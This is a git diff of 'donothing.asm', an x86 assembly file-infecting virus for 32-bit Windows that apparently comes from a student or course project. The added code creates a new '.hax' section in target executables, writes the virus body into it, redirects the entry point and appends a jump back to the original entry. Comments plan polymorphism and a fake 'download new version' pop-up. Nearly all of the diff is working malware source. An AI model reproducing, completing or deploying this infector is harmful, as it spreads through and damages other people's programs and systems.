@@ -1,10 +1,12 @@
-; donothing.asm FOR 32 BIT archs only
-; new section -> addr la plus grande d une section + sa taille
-; si pas la place -> quit
+; donothing.asm FOR 32 BIT archs only - Little Endian
 ; bonus: UPX unpacker
-; bonus: infecte peut infecter
+; bonus: infecte peut infecter DONE
 ; bonus: ne pas modifier entry point
 ; bonus: polymorphique obligatoire
+; Required: Ignore errors (check for them first..)
+; bonus: if no room, write at the old entry point
+;       + pop up window "New version, download it please"
+;       + then quit =)
 
 .386
 .model flat, stdcall
@@ -230,8 +232,65 @@ infect_file:
     push    [ebp+12] ; PE header
     push    [ebp+8]  ; DOS header
     call    new_code_section
+    mov     edi,eax ; save the old entry point
 
-    pop     ebx ; restore the fd
+    pop     esi ; restore the fd
+    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+    ; Write ourselves in the new code section
+    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+    ; Get the size of the virus
+    mov     edx,[ebp+16]
+    add     edx,offset start
+    sub     edx,offset deltaoffset
+    
+    mov     ecx,[ebp+16]
+    add     ecx,offset jambi_end
+    sub     ecx,offset deltaoffset
+    
+    sub     ecx,edx ; jambi_end - start
+    push    edx     ; save start addr
+    ; edx -> start addr / ecx -> size
+    ; Write the v1ruuu5 n0wWw!!!
+    
+    ; Get WriteFile addr
+    mov     eax,[ebp+16]
+    add     eax,offset WriteFile_b
+    sub     eax,offset deltaoffset
+    push    eax ; Address of the func name
+    push    [ebp+12] ; PE header
+    push    [ebp+8]  ; DOS header
+    call    ent_get_function_addr
+    pop     edx ; restore start addr
+    
+    ; Write the new section header
+    push    0
+    push    0
+    push    ecx ; size
+    push    edx ; addr
+    push    esi ; fd
+    call    eax
+    
+    ; Build the "jmp Original Entry Point" code
+    sub     esp,8       ; some space
+    mov     ebx,esp     ; save esp 
+    mov     al,0BAh 
+    mov     [ebx],al    ; mov edx,
+    add     ebx,2
+    mov     [ebx],edi   ; old entry point 
+    add     ebx,4
+    mov     ax,0E2FFh   ; jmp edx
+    mov     [ebx],ax
+    
+    ; Write the jmp at the end
+    push    0
+    push    0
+    push    7   ; size
+    push    esp ; addr
+    push    esi ; fd
+    call    eax
+    add     esp,8 ; restore stack
+    
+    ; Done
     mov     eax,[ebp+16]
     add     eax,offset CloseHandle_b
     sub     eax,offset deltaoffset
@@ -240,7 +299,7 @@ infect_file:
     push    [ebp+8]  ; DOS header
     call    ent_get_function_addr
     ; CloseHandle(fd)
-    push    ebx
+    push    esi
     call    eax
 
 end_infect_file:
@@ -252,64 +311,6 @@ end_infect_file:
     pop     ebp
     ret     20
 
-
-
-
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;;                                                    ;;
-;;                  Code Benjamin                     ;;
-;;                                                    ;;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-benjamin:
-    ; Get CreateFile addr
-    mov     eax,ebp
-    add     eax,offset CreateFile_b
-    sub     eax,offset deltaoffset
-    push    eax ; Address of the func name
-    push    edi ; PE header
-    push    esi ; DOS header
-    call    ent_get_function_addr
-
-    ; TODO: foreach file in current dir
-    ; Open a file (TODO: use each file)
-    push    0 ; attr template
-    push    FILE_ATTRIBUTE_NORMAL
-    push    OPEN_EXISTING
-    push    0 ; default security
-    mov     ebx,FILE_SHARE_READ
-    xor     ebx,FILE_SHARE_WRITE
-    push    ebx ; read && write
-    mov     ebx,GENERIC_READ
-    xor     ebx,GENERIC_WRITE
-    push    ebx ; read && write
-    mov     ebx,ebp
-    add     ebx,offset testFile
-    sub     ebx,offset deltaoffset
-    push    ebx ; .exe path
-    call    eax ; CreateFile()
-
-    push    eax ; save the fd
-    ; Create a new section
-    push    eax ; File descriptor
-    push    ebp ; Delta offset
-    push    edi ; PE header
-    push    esi ; DOS header
-    call    new_code_section
-
-    pop     ebx ; restore the fd
-    mov     eax,ebp
-    add     eax,offset CloseHandle_b
-    sub     eax,offset deltaoffset
-    push    eax ; Address of the func name
-    push    edi ; PE header
-    push    esi ; DOS header
-    call    ent_get_function_addr
-    ; CloseHandle(fd)
-    push    ebx
-    call    eax
-
-    call exit_success
-
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Create a new code section in the executable
 ; Return the old entry point (to resume execution after our payload) or 0
@@ -320,12 +321,6 @@ benjamin:
 ;   file descriptor to a .exe (r+w) -> ebp + 20
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 new_code_section:
-
-    nop
-    nop
-    nop
-    nop
-    nop ; debug markers
     
     ; Set up a stack frame
     push    ebp
@@ -453,6 +448,8 @@ new_code_section:
     push    [ebp+20]
     call    ebx
 
+    mov     [esi+16],eax ; save the file offset to the number of section
+
     ; Write the updated number of section
     mov     ebx,[ebp-20]
     push    0
@@ -462,6 +459,7 @@ new_code_section:
     push    [ebp+20]
     call    ebx
 
+    ; Create a new section header
     push    [ebp+20] ; file descriptor
     push    [ebp+16] ; delta offset
     push    [ebp+12] ; PE header
@@ -470,14 +468,57 @@ new_code_section:
     push    [ebp-20] ; writefile
     push    [ebp-24] ; setfilepointer
     push    edi      ; old number of section
-    push    esi      ; Addr to collect the PTR TO RAW DATA
+    push    esi      ; Addr to collect new section data
     call    new_image_section_header
-    ; -> esi(esp) -> struct(sizeV,rva,etc.etc)
-    ; tODO: before, save setfileptr ret
-    ; -> update image opt header avec + sizes
-    ; -> setfileptr to PTR TO RAW DATA
-    ; -> return the old entry point (RVA new section)
 
+
+    mov     eax,[esi+16] ; file offset to number of section
+    add     eax,22h ; move to the entry point address
+    ; Move to the entry point
+    mov     ebx,[ebp-24]
+    push    FILE_BEGIN
+    push    0
+    push    eax
+    push    [ebp+20]
+    call    ebx
+
+    ; Read(fd, esi, 4, 0, 0) entry point
+    mov     ebx,[ebp-16]
+    push    0
+    push    0
+    push    4
+    lea     edi,[esi+20]
+    push    edi
+    push    [ebp+20]
+    call    ebx
+
+    ; Move to the entry point 
+    mov     ebx,[ebp-24]
+    push    FILE_CURRENT
+    push    0
+    push    -4
+    push    [ebp+20]
+    call    ebx
+
+    ; Write the updated entry point address
+    mov     ebx,[ebp-20]
+    push    0
+    push    0
+    push    4
+    lea     edi,[esi+4]
+    push    edi
+    push    [ebp+20]
+    call    ebx
+
+    ; Move to future new section
+    mov     ebx,[ebp-24]
+    push    FILE_BEGIN
+    push    0
+    push    [esi+12]
+    push    [ebp+20]
+    call    ebx
+
+    mov     eax,[esi+20] ; old entry point
 
     ; cleanup/return
     add     esp,12 ; alloc for func ptrs
@@ -613,15 +654,43 @@ image_section_done:
     push    0 ; number of line numbers + relocations
     push    0 ; ptr to line numbers
     push    0 ; ptr to relocations
-    push    0 ; TODO ptr to raw data
-    push    virusSize ; size of raw data TODO -> delta offset
-    push    0 ; TODO RVA
-    push    0 ; TODO Virtual size (virusSize aligned)
+
+    mov     edx,[ebp+8] ; caller's stack
+    mov     ebx,[edx+12] ; Virtual size
+    mov     ecx,[edx+8] ; Raw data ptr
+    add     ebx,ecx ; New raw data ptr
+    push    ebx ; RVA
+
+    mov     edx,[ebp+36]
+    add     edx,offset start
+    sub     edx,offset deltaoffset
+    mov     ecx,[ebp+36]
+    add     ecx,offset jambi_end
+    sub     ecx,offset deltaoffset
+    sub     ecx,edx ; jambi_end - start
+    push    ecx ; virusSize (not aligned)
+
+    mov     edx,[ebp+8] ; caller's stack
+    mov     ebx,[edx] ; Virtual size
+    mov     ecx,[edx+4] ; RVA
+    add     ebx,ecx ; New RVA
+    push    ebx ; RVA
+
+
+    mov     edx,[ebp+36]
+    add     edx,offset start
+    sub     edx,offset deltaoffset
+    mov     ecx,[ebp+36]
+    add     ecx,offset jambi_end
+    sub     ecx,offset deltaoffset
+    sub     ecx,edx ; jambi_end - start
+    push    ecx ; virusSize (not aligned)
+    
     push    0 ; Null padd for name
     push    7861682eh ; name: .hax
     mov     esi,esp ; save esp
 
-    ; Write the updated number of section
+    ; Write the new section header
     mov     ebx,[ebp+20]
     push    0
     push    0
@@ -629,8 +698,21 @@ image_section_done:
     push    esi ; struct address on stack
     push    [ebp+40]
     call    ebx
+    add     esp,40 ; remove the struct
 
-    ; return success
+    ; Now we need to save it for the caller
+    mov     edi,[ebp+8] ; caller's stack (dest)
+
+    mov     eax,[esi+8]
+    mov     [edi],eax ; new vsize
+    mov     eax,[esi+12]
+    mov     [edi+4],eax ; rva
+    mov     eax,[esi+16]
+    mov     [edi+8],eax ; raw data size
+    mov     eax,[esi+20]
+    mov     [edi+12],eax ; raw data ptr 
+
+    ; return success (not useful *yet*)
     mov     eax,0
 
     ; cleanup/return
@@ -733,9 +815,6 @@ ent_next_name:
 
     push    ecx             ; Save edx
     push    edx             ; Save edx
-    nop
-    nop ; Markers for debugging
-    nop
     push    ebx
     push    esi
     call    strcmp_
@@ -910,41 +989,20 @@ strcmp_done:
 
 exit_success:
     ; WIN
-    mov     eax,042h
-    call    eax
+    mov     edx,042h
+    call    edx
 
 exit_fail:
     ; For debug :D
-    mov     eax,0DEADBEEFh
-    call    eax
+    mov     edx,0DEADBEEFh
+    call    edx
 
 ; All the virus data: use delta offset
 ; @MARC: ca ne peut pas marcher sauf si tu
 ; force la zone en r/w avec mprotect?
 virus_data:
-   filetime struct
-       dwLowDateTime     DWORD     ?
-       dwHighDateTime    DWORD     ?
-   filetime ends
-
-   find_data struct
-       dwFileAttributes       DWORD ?
-       ftCreationTime         filetime <?>
-       ftLastAccessTime       filetime <?>
-       ftLastWriteTime        filetime <?>
-       nFileSizeHigh          DWORD ?
-       nFileSizeLow           DWORD ?
-       dwReserved0            DWORD ?
-       dwReserved1            DWORD ?
-       cFileName              BYTE 260 dup (?)
-       cAlternateFileName     BYTE 14  dup (?)
-   find_data ends
-
    ;win32_find_data find_data <?>
-   filter          db "*.exe",0
-   testFile        db "C:\Users\Benjamin\Documents\GitHub\donothing\TP0\donothing_2.exe",0
-   testStr         db "bite",0
-   virusSize       equ jambi_end - start
+   filter           db "*.exe",0
 
    FindFirstFile_b  db  "FindFirstFileA",0
    FindNextFile_b   db  "FindNextFileA",0
@@ -955,6 +1013,8 @@ virus_data:
    CloseHandle_b    db  "CloseHandle",0
    SetFilePointer_b db  "SetFilePointer",0
    ReadFile_b       db  "ReadFile",0
+
+   LastHax          db  "Stupid 2012 Virushmock! The Profesor is in town again !!!",0
 
 jambi_end:
 end start
